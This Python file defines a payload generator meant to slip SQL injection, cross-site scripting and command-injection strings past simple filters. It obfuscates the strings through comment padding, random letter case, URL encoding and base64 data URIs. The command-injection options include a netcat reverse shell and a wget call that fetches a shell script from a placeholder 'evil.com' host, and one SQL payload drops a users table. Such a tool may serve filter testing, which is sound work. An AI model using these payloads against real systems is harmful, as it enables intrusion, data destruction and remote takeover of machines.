
import random
import base64
import urllib.parse

class PayloadGenerator:
    """Generates polymorphic payloads to bypass simple filters."""

    def __init__(self):
        self.sqli_base = [
            "UNION SELECT 1,2,3",
            "OR 1=1",
            "DROP TABLE users"
        ]
        self.xss_base = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        ]

    def obfuscate_sql(self, payload):
        strategy = random.choice(["comments", "case", "hex", "none"])
        if strategy == "comments":
            return payload.replace(" ", "/**/")
        elif strategy == "case":
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in payload])
        elif strategy == "hex":
            # Simple hex encoding of string literals if present
            return payload # Placeholder
        return payload

    def obfuscate_xss(self, payload):
        strategy = random.choice(["url", "base64", "none"])
        if strategy == "url":
            return urllib.parse.quote(payload)
        elif strategy == "base64":
            # Often used in data wrappers
            b64 = base64.b64encode(payload.encode()).decode()
            return f"data:text/html;base64,{b64}"
        return payload

    def generate(self, attack_type):
        if attack_type == "SQLi":
            base = random.choice(self.sqli_base)
            return self.obfuscate_sql(base)
        elif attack_type == "XSS":
            base = random.choice(self.xss_base)
            return self.obfuscate_xss(base)
        elif attack_type == "RCE":
            # Simple variants
            return random.choice([
                "; /bin/sh",
                "| nc -e /bin/sh 127.0.0.1 4444",
                "$(wget http://evil.com/shell.sh)"
            ])
        return "TEST"
